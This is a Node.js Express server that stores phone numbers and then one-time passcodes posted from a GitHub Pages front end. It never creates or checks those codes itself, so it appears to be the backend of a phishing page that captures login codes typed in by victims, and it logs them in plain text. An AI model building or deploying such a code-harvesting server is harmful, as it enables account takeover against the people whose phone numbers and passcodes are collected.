require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(cors({
  origin: 'https://anonfr.github.io' // Replace with your GitHub Pages URL
}));
app.use(bodyParser.json());

mongoose.connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('Could not connect to MongoDB', err));

const userSchema = new mongoose.Schema({
  countryCode: String,
  phoneNumber: String,
  otp: String
});

const User = mongoose.model('User', userSchema);

app.post('/api/save-phone', async (req, res) => {
  const { countryCode, phoneNumber } = req.body;
  console.log('Received phone number:', countryCode, phoneNumber);
  try {
    const user = new User({ countryCode, phoneNumber });
    await user.save();
    console.log('Saved to database:', user);
    res.json({ message: 'Phone number saved successfully' });
  } catch (error) {
    console.error('Error saving phone number:', error);
    res.status(500).json({ error: 'Error saving phone number' });
  }
});

app.post('/api/save-otp', async (req, res) => {
  const { countryCode, phoneNumber, otp } = req.body;
  console.log('Received OTP data:', { countryCode, phoneNumber, otp });
  
  try {
    const user = await User.findOne({ countryCode, phoneNumber });
    console.log('Found user:', user);
    
    if (user) {
      user.otp = otp;
      const savedUser = await user.save();
      console.log('User after saving OTP:', savedUser);
      res.json({ message: 'OTP saved successfully', savedOtp: savedUser.otp });
    } else {
      console.log('User not found for:', { countryCode, phoneNumber });
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) {
    console.error('Error saving OTP:', error);
    res.status(500).json({ error: 'Error saving OTP' });
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
